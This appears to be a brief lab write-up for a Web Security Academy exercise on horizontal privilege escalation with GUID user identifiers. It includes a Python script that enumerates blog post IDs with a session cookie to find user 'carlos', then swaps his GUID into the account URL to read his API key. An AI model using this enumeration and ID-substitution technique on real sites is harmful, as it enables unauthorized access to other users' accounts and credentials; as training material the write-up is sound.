this lab has  horizontal privilege escalation vulnerability on the user account page, but identifies users with **GUIDs**. 

**what** is (**`GUID`**) it mean Global Unique Identifiers are 128-bit identifiers used to uniquely identify resources in computing.

we should to find the blog post by `carlos`.
[create virtual env](https://docs.python.org/3/library/venv.htmll)
[install request ](https://pypi.org/project/requests/)
[install Beautifulsoup4](https://pypi.org/project/beautifulsoup4/)

```python
import requests as req
from bs4 import BeautifulSoup

FIX_URL = "https://0ae400e4039c99b6806ec13f009d0070.web-security-academy.net/post"

cookies = {
    "session": "VPXP6au5Um0txPJ5zMKgMYu4kOwMabDJ"
}

for i in range(10) :
    params = {
            "postId": i +1,
            }
    r = req.get(FIX_URL, cookies=cookies, params=params)
    print(r.status_code)
    soup = BeautifulSoup(r.text, "html.parser")
    text = soup.get_text()
    if "carlos" in text:
        print(f"found the blog id {i + 1}")

```

result :
```bash
found the blog id 3

found the blog id 6

found the blog id 9
```

just enter to any blog belong to this ids [3, 6, 9]
after that we found url that for carlos , and we get the GUID  .
you can see it in url **`userid pramter`**

![[/images/Screenshot from 2026-02-25 14-41-32.png]]
 after that we use the GUID and put in the url of my-account?id=**HERE PUT THE GUID**
 and we get the API key .